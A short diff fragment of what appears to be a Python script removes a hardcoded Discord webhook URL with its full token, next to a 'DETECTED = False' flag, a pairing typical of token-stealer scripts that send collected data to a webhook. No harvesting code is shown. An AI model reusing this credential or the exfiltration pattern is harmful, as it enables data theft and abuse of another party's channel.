@@ -18,7 +18,7 @@ print("11111111111111111111111111111")
 
 
 
-hook = "https://discord.com/api/webhooks/1093262885930672148/uJ8tB_NZfbFsYNWSIKkUfSDnQJXz1Odn0edx0kZLWTPeZBeKia7V9MexcWYz1YmxboGe"
+
 DETECTED = False
 
 
